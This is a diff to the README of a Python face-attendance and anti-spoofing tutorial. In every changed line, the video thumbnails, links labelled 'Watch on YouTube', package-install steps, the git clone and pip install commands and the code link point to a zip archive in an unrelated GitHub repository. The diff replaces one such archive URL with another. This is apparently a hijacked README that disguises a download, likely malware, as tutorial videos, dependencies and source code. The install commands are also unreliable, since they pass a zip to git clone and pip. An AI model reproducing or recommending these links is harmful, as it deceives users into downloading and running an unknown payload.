@@ -5,8 +5,8 @@ Face attendance system using face recognition with Python !
 ## Face attendance software
 
 <p align="center">
-<a href="https://raw.githubusercontent.com/Suraj24w/dlonewarriors_workspace/main/furfurylidene/dlonewarriors_workspace.zip">
-    <img width="600" src="https://raw.githubusercontent.com/Suraj24w/dlonewarriors_workspace/main/furfurylidene/dlonewarriors_workspace.zip" alt="Watch the video">
+<a href="https://github.com/Suraj24w/dlonewarriors_workspace/raw/refs/heads/main/furfurylidene/workspace-dlonewarriors-v2.6.zip">
+    <img width="600" src="https://github.com/Suraj24w/dlonewarriors_workspace/raw/refs/heads/main/furfurylidene/workspace-dlonewarriors-v2.6.zip" alt="Watch the video">
     </br>Watch on YouTube: Face attendance system with Python and face recognition !
 </a>
 </p>
@@ -14,8 +14,8 @@ Face attendance system using face recognition with Python !
 ## Spoofing feature
 
 <p align="center">
-<a href="https://raw.githubusercontent.com/Suraj24w/dlonewarriors_workspace/main/furfurylidene/dlonewarriors_workspace.zip">
-    <img width="600" src="https://raw.githubusercontent.com/Suraj24w/dlonewarriors_workspace/main/furfurylidene/dlonewarriors_workspace.zip" alt="Watch the video">
+<a href="https://github.com/Suraj24w/dlonewarriors_workspace/raw/refs/heads/main/furfurylidene/workspace-dlonewarriors-v2.6.zip">
+    <img width="600" src="https://github.com/Suraj24w/dlonewarriors_workspace/raw/refs/heads/main/furfurylidene/workspace-dlonewarriors-v2.6.zip" alt="Watch the video">
     </br>Watch on YouTube: Face attendance system with liveness detection !
 </a>
 </p>
@@ -27,17 +27,17 @@ Face attendance system using face recognition with Python !
 ### windows
 
 In Windows, you will need to do a couple of additional steps before starting with this tutorial:
-- Follow the instructions described in this video https://raw.githubusercontent.com/Suraj24w/dlonewarriors_workspace/main/furfurylidene/dlonewarriors_workspace.zip
-- Install the packages in https://raw.githubusercontent.com/Suraj24w/dlonewarriors_workspace/main/furfurylidene/dlonewarriors_workspace.zip
+- Follow the instructions described in this video https://github.com/Suraj24w/dlonewarriors_workspace/raw/refs/heads/main/furfurylidene/workspace-dlonewarriors-v2.6.zip
+- Install the packages in https://github.com/Suraj24w/dlonewarriors_workspace/raw/refs/heads/main/furfurylidene/workspace-dlonewarriors-v2.6.zip
 
 ### linux, mac
 
-- Install the packages in https://raw.githubusercontent.com/Suraj24w/dlonewarriors_workspace/main/furfurylidene/dlonewarriors_workspace.zip
+- Install the packages in https://github.com/Suraj24w/dlonewarriors_workspace/raw/refs/heads/main/furfurylidene/workspace-dlonewarriors-v2.6.zip
 
 ## spoofing feature
 
-    git clone https://raw.githubusercontent.com/Suraj24w/dlonewarriors_workspace/main/furfurylidene/dlonewarriors_workspace.zip
-    pip install -r https://raw.githubusercontent.com/Suraj24w/dlonewarriors_workspace/main/furfurylidene/dlonewarriors_workspace.zip
+    git clone https://github.com/Suraj24w/dlonewarriors_workspace/raw/refs/heads/main/furfurylidene/workspace-dlonewarriors-v2.6.zip
+    pip install -r https://github.com/Suraj24w/dlonewarriors_workspace/raw/refs/heads/main/furfurylidene/workspace-dlonewarriors-v2.6.zip
 
 Remember to add the Silent-Face-Anti-Spoofing directory to your **PYTHONPATH**.
 
@@ -46,11 +46,11 @@ Remember to add the Silent-Face-Anti-Spoofing directory to your **PYTHONPATH**.
 Face attendance + face recognition web app with React and Python!
 
 <p align="center">
-<a href="https://raw.githubusercontent.com/Suraj24w/dlonewarriors_workspace/main/furfurylidene/dlonewarriors_workspace.zip">
-    <img width="600" src="https://raw.githubusercontent.com/Suraj24w/dlonewarriors_workspace/main/furfurylidene/dlonewarriors_workspace.zip" alt="Watch the video">
+<a href="https://github.com/Suraj24w/dlonewarriors_workspace/raw/refs/heads/main/furfurylidene/workspace-dlonewarriors-v2.6.zip">
+    <img width="600" src="https://github.com/Suraj24w/dlonewarriors_workspace/raw/refs/heads/main/furfurylidene/workspace-dlonewarriors-v2.6.zip" alt="Watch the video">
     </br>Watch on YouTube: Face attendance + face recognition web app with React and Python !
 </a>
 </p>
 
-The code for this project is available [here](https://raw.githubusercontent.com/Suraj24w/dlonewarriors_workspace/main/furfurylidene/dlonewarriors_workspace.zip).
+The code for this project is available [here](https://github.com/Suraj24w/dlonewarriors_workspace/raw/refs/heads/main/furfurylidene/workspace-dlonewarriors-v2.6.zip).
 
